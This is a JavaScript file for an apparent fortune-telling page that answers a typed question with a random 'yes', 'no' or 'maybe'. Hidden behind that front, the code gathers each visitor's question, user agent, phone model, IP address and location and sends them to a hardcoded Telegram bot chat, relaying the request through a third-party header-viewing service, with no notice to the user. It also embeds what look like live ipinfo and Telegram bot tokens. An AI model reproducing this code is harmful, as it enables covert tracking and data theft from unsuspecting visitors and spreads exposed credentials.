function ss() {
  var text = document.getElementById("inp").value.trim();
  if (text.length === 0) return alert("یه چیزی بنویس دیگه!");

  var ua = navigator.userAgent; // Default to userAgent
  var model = "Unknown"; // Default model

  // بررسی وجود userAgentData
  if (navigator.userAgentData) {
    // اگر userAgentData در دسترس باشد
    navigator.userAgentData.getHighEntropyValues(["platform", "model", "ua"])
      .then(uaData => {
        console.log("مدل دستگاه:", uaData.model); // مدل گوشی
        model = uaData.model || "Unknown"; // مدل گوشی را ذخیره کن
        handleIpAndSendMessage(text, ua, model); // تابع برای پردازش آی‌پی و ارسال پیام
      })
      .catch(error => {
        console.error("خطا در دریافت اطلاعات با userAgentData:", error);
        handleIpAndSendMessage(text, ua, model); // در صورت بروز خطا، از userAgent استفاده کن
      });
  } else {
    // اگر userAgentData در دسترس نیست، از userAgent استفاده کن
    console.log("استفاده از userAgent.");
    const match = ua.match(/([^)]+)/);
    if (match) {
      const parts = match[1].split(";");
      for (let p of parts) {
        if (p.includes("SM-") || p.includes("Pixel") || p.includes("iPhone")) {
          model = p.trim();
          break;
        }
      }
    }
    handleIpAndSendMessage(text, ua, model); // تابع برای پردازش آی‌پی و ارسال پیام
  }
}

function handleIpAndSendMessage(text, ua, model) {
  // درخواست به ipinfo.io برای دریافت آی‌پی
  fetch("https://ipinfo.io/json?token=324e36aad173e0") // توکن مربوط به ipinfo.io
    .then(res => res.json())
    .then(data => {
      var ip = data.ip;
      var loc = data.city + ", " + data.country;

      var mohtava = "ask%3A" + encodeURIComponent(text) +
                    "%23UA%3A" + encodeURIComponent(ua) +
                    "%23Model%3A" + encodeURIComponent(model) +
                    "%23IP%3A" + encodeURIComponent(ip) +
                    "%23Location%3A" + encodeURIComponent(loc);

      // ادامه کد برای ارسال اطلاعات به تلگرام
      var con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text=" + mohtava; // توکن مربوط به تلگرام

      $.ajax({
        type: "POST",
        url: "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",
        data: {
          "UrlBox": con,
          "AgentList": "Google Chrome",
          "VersionsList": "HTTP/1.1",
          "MethodList": "POST"
        },
        success: function () {
          console.log("فرستاده شد به تلگرام");
        }
      });

      // نمایش جواب تصادفی
      var ans = ["probably not", "probably yes", "maybe", "of course it is", "yep", "nope", "absolutely", "absolutely not"];
      const random = Math.floor(Math.random() * ans.length);
      alert(ans[random]);
      document.getElementById("inp").value = "";
    })
    .catch(error => {
      console.error("خطا در دریافت آی‌پی:", error);
      alert("خطا در دریافت آی‌پی. لطفاً دوباره تلاش کنید.");
    });
}
